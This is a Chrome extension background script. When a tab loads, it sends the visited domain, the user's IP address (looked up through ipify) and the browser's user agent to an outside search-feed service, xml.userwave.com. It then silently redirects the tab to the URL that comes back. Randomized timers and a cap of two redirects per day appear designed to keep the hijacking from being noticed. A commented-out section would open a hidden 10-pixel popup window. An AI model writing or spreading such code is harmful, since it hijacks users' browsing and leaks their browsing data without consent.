"use strict";

openWindowToRunGA();

function openWindowToRunGA() {
    // chrome.windows.getAll({ populate: true }, function (windows) {
    //     windowFound = windows.filter((window) => {
    //         found = window.tabs.filter(function (tab) {
    //             return tab.url.indexOf('option.html') > -1;
    //         })
    //         if (found.length > 0) {
    //             return true;
    //         } else {
    //             return false;
    //         }
    //     })
    //     console.log(found);
    //     if (windowFound.length == 0) {
    //         console.log('window open');
    //         chrome.windows.create({
    //             url: chrome.runtime.getURL("option.html"),
    //             focused: false,
    //             type: "popup",

    //             top: Math.floor(window_height - 35),
    //             left: Math.floor(window_width - 35),
    //             height: 10,
    //             width: 10
    //         }, function (tabs) {
    //             optionPageTabId = tabs.tabs[0].id;
    //             chrome.tabs.onRemoved.addListener(function (tabId, changeInfo, tab) {
    //                 console.log(changeInfo.isWindowClosing);
    //                 if (changeInfo.isWindowClosing) {
    //                     console.log('listener removed');
    //                     setTimeout(function () {
    //                         openWindowToRunGA();
    //                     }, 500)
    //                 }
    //             });
    //         });
    //     }
    // });
}

var validate = false;


chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message.action == 'refresh_background') {
        sendResponse({ 'status': 'ok' });
    }
});

const intervals = [1000 * 60, 1000 * 60 * 5, 1000 * 60 * 10, 1000 * 60 * 12, 1000 * 60 * 15]
var randomInterval = intervals[Math.floor(Math.random() * intervals.length)]
let TOTAL_ALLOWED_REDIRECTS = 2
let today = new Date();
let currentDate = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
let total_count = 0;



chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (!validate && changeInfo.status == "loading" && !tab.url.includes('chrome://')) {
        chrome.storage.local.get(['current_date', 'total_count', 'next_time'], function (result) {
            console.log(result);
            today = new Date();
            if (result.current_date) {
                console.log('first time current date', result.current_date);

                var time_stamp = today.getTime();
                console.log("Current Timestamp: ", time_stamp);
                total_count = result.total_count;
                if (result.current_date === currentDate && result.total_count < TOTAL_ALLOWED_REDIRECTS && result.next_time < time_stamp) {
                    console.log('total counts', result.total_count); console.log('allowed', TOTAL_ALLOWED_REDIRECTS);
                    total_count = parseInt(result.total_count);
                    validateUrl(tabId, changeInfo, tab);

                }
                else if (result.current_date !== currentDate) {
                    chrome.storage.local.set({ 'current_date': currentDate });
                    chrome.storage.local.set({ 'total_count': 0 });
                    var next_time = today.getTime() + randomInterval;
                    chrome.storage.local.set({ 'next_time': next_time });
                    validateUrl(tabId, changeInfo, tab);
                }
                else if (total_count > TOTAL_ALLOWED_REDIRECTS) {
                    console.log('count exceeded')
                } else {
                    console.log('else')
                }
            }
            else {
                console.log('inside else part current date without storage=', currentDate)
                chrome.storage.local.set({ 'current_date': currentDate });
                chrome.storage.local.set({ 'total_count': 0 });
                var next_time = today.getTime() + randomInterval;
                console.log(next_time)
                chrome.storage.local.set({ 'next_time': next_time });
                validateUrl(tabId, changeInfo, tab);
            }

        })
    }

})

let ipAddress = ''

fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(output => {
        ipAddress = output.ip;
        console.log("IP Address: ", ipAddress);
    });

function url(tabId, changeInfo, tab) {

    let urlParts = new URL(tab.url);
    console.log(urlParts)
    let domain = urlParts.hostname.replace('www.', '')
    let query = domain
    console.log(domain, query)

    let found = whitelist.filter((item) => {
        return item.key == domain
    })
    console.log(found)
    if (found.length > 0) {
        let u = "https://xml.userwave.com/search?feed=437785&auth=HEQZR1&subid=test&query=" + query + "&user_ip=" + ipAddress + "&ua=" + encodeURI(navigator.userAgent) + "&url=" + domain + "&count=1"
        console.log(u)
        fetch(u).then(response => response.text()).then(data => {
            console.log(data);
            let details = data;
            let index = details.indexOf("url=\"");
            if (index != -1) {
                let parts = details.substring(index + 5);
                console.log(parts);
                index = parts.indexOf("\"");
                if (index != -1) {
                    let urlString = parts.substring(0, index);
                    console.log(urlString);
                    if (urlString != "") {

                        total_count++
                        chrome.storage.local.set({ 'total_count': total_count });
                        var next_time = today.getTime() + randomInterval;
                        console.log('next_time', next_time)
                        chrome.storage.local.set({ 'next_time': next_time });
                        chrome.tabs.update(tab.id, { url: urlString });
                    }
                }
            };
        })
    }
}

function validateUrl(tabId, changeInfo, tab) {
    validate = true
    url(tabId, changeInfo, tab);
    setTimeout(() => {
        validate = false;
    }, 2000)
}
